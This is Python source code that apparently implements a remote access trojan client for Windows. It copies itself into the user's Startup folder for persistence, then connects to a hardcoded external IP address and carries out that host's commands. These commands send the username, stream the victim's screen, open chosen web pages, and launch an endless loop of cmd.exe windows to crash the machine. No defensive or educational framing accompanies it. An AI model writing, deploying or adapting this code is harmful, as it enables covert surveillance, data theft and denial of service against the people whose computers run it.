import socket
import os
import traceback
import shutil
from vidstream import ScreenShareClient
import threading
import time
import webbrowser

ip = "77.250.137.62"
port = 8080
keepgoing = True

try:
    source = os.getcwd() + "\\client.exe"
    print(source)
    username = os.getlogin()
    destination = "C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\new.exe"
    shutil.copyfile(source, destination)
except:
    print("nope")



while (keepgoing == True):
    try:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        address = (ip,port)
        sock.connect(address)
        msg = sock.recv(1024)
        msg = msg.decode()
        while keepgoing == True:
            if msg == "print":
                print("hello print test")
            elif msg == "exit":
                keepgoing = False
            elif msg == "username":
                username = os.getlogin()
                sock.send(username.encode())
            elif msg == "screenshare":
                sock.close()
                sender = ScreenShareClient("77.250.137.62", 8080)
                t = threading.Thread(target=sender.start_stream)
                t.start()
                time.sleep(10)
                sender.stop_stream()
            elif msg == "website":
                website = sock.recv(1024)
                website = website.decode()
                webbrowser.open(website, new=1)
            elif msg == "crash":
                while True:
                    os.system("start /B start cmd.exe")
                    print("started")

    except:
        traceback.print_exc()
        continue
